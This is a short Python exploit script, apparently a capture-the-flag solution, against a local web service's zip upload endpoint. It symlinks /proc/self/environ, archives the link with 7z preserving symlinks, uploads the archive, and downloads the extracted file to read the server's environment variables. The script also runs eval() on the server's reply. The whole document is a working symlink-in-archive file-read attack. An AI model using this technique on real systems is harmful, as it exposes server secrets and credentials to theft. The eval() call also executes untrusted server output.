#!/usr/bin/env python3

import subprocess

import requests

url = "http://localhost:49047"
out_filename = "environ"
zip_filename = f"{out_filename}.zip"

s = requests.session()
s.get(url)

subprocess.run(["ln", "-sf", "/proc/self/environ",
               out_filename], stdout=subprocess.PIPE)
subprocess.run(["7z", "a", "-snl", zip_filename,
               out_filename], stdout=subprocess.PIPE)

file = {
    "file": open(zip_filename, "rb")
}

r = s.post(f"{url}/uploadzip", files=file)
print(r.text)

resp = eval(r.text)
out_dir = resp["filename"]

r = s.get(f"{url}/{out_dir}/{out_filename}")
print(r.request.path_url)
print(r.text.split("\x00"))
